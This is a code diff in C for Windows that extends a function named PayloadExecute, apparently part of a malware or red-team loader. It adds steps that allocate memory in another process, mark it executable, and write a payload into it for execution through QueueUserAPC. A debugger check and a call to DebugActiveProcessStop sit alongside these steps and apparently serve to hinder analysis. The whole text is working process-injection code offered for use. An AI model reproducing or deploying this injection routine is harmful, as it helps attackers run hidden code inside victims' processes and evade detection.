@@ -7,7 +7,25 @@ BOOL PayloadExecute( IN OPTIONAL HANDLE hProcess, IN HANDLE hThread, IN PBYTE pP
 
 	PVOID pAddress = NULL;
 	DWORD dwOldProtection = NULL;
-    PBOOL bDebuggerPresent = NULL;
+    BOOL bDebuggerPresent = FALSE;
+    SIZE_T		sNmbrOfBytesWritten = NULL;
+
+    pAddress = pVirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	if (pAddress == NULL) {
+		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	if (!pVirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+		printf("[!] VirtualProtectEx Failed With Error: %d\n", GetLastError());
+		return FALSE;
+	}
+
+	if (!pWriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNmbrOfBytesWritten) || sPayloadSize != sNmbrOfBytesWritten) {
+		printf("[!] WriteProcessMemory Failed With Error: %d\n[i] Wrote %d Of %d Bytes \n", GetLastError(), (int)sNmbrOfBytesWritten, (int)sPayloadSize);
+		return FALSE;
+	}
 
 	// If hThread is in an alertable state, QueueUserAPC will run the payload directly
 	// If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after
@@ -16,6 +34,7 @@ BOOL PayloadExecute( IN OPTIONAL HANDLE hProcess, IN HANDLE hThread, IN PBYTE pP
 		return FALSE;
 	}
 
+    
     if (CheckRemoteDebuggerPresent(hProcess, &bDebuggerPresent)) {
         if (!DebugActiveProcessStop(GetProcessId(hProcess))) {
             printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
